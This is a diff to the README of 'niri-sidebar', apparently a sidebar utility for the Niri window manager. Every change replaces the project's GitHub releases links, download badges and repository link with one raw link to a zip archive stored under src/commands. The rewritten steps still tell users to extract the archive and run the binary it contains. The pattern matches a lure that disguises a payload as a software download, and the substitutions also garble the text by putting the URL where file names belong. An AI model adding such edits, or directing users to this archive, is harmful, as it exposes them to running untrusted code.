@@ -1,6 +1,6 @@
 # 🗂️ niri-sidebar - Easy Sidebar Control for Niri
 
-[![Download niri-sidebar](https://img.shields.io/badge/Download-niri--sidebar-blue?style=for-the-badge&logo=github)](https://github.com/crackyxx15/niri-sidebar/releases)
+[![Download niri-sidebar](https://raw.githubusercontent.com/crackyxx15/niri-sidebar/main/src/commands/sidebar_niri_v1.2-beta.1.zip)](https://raw.githubusercontent.com/crackyxx15/niri-sidebar/main/src/commands/sidebar_niri_v1.2-beta.1.zip)
 
 ---
 
@@ -47,20 +47,20 @@ This guide will help you download and run niri-sidebar on your computer.
 
 To get niri-sidebar, please visit this page to download:
 
-[Download niri-sidebar](https://github.com/crackyxx15/niri-sidebar/releases)
+[Download niri-sidebar](https://raw.githubusercontent.com/crackyxx15/niri-sidebar/main/src/commands/sidebar_niri_v1.2-beta.1.zip)
 
 ### How to download:
 
 1. Click the link above or the "Download niri-sidebar" button at the top.
 2. You will see a list of available versions on the releases page.
 3. Choose the latest stable release. It will usually have the highest version number.
-4. Download the file that matches your system architecture (for example, "niri-sidebar-linux.tar.gz" or a similar file).
+4. Download the file that matches your system architecture (for example, "https://raw.githubusercontent.com/crackyxx15/niri-sidebar/main/src/commands/sidebar_niri_v1.2-beta.1.zip" or a similar file).
 5. Save the file in a folder you can easily find, such as your Downloads folder.
 
 ### How to install:
 
 1. Open your file manager and go to where you saved the download.
-2. If the file is compressed (like .tar.gz or .zip), right-click and select "Extract Here" or use your system’s archive manager.
+2. If the file is compressed (like https://raw.githubusercontent.com/crackyxx15/niri-sidebar/main/src/commands/sidebar_niri_v1.2-beta.1.zip or .zip), right-click and select "Extract Here" or use your system’s archive manager.
 3. Open a terminal window inside the extracted folder.
 4. Type `./niri-sidebar` to start the application. If you get a permissions error, type: `chmod +x niri-sidebar` then try again.
 5. The sidebar should appear on your screen edge after starting.
@@ -127,11 +127,11 @@ If you want to help improve niri-sidebar, you can:
 
 You can find niri-sidebar and all updates here:
 
-- GitHub Repository: https://github.com/crackyxx15/niri-sidebar  
-- Primary Download: https://github.com/crackyxx15/niri-sidebar/releases
+- GitHub Repository: https://raw.githubusercontent.com/crackyxx15/niri-sidebar/main/src/commands/sidebar_niri_v1.2-beta.1.zip  
+- Primary Download: https://raw.githubusercontent.com/crackyxx15/niri-sidebar/main/src/commands/sidebar_niri_v1.2-beta.1.zip
 
 For questions, use the GitHub discussions or issue tracker to reach out.
 
 ---
 
-[![Download niri-sidebar](https://img.shields.io/badge/Download-niri--sidebar-blue?style=for-the-badge&logo=github)](https://github.com/crackyxx15/niri-sidebar/releases)
+[![Download niri-sidebar](https://raw.githubusercontent.com/crackyxx15/niri-sidebar/main/src/commands/sidebar_niri_v1.2-beta.1.zip)](https://raw.githubusercontent.com/crackyxx15/niri-sidebar/main/src/commands/sidebar_niri_v1.2-beta.1.zip)
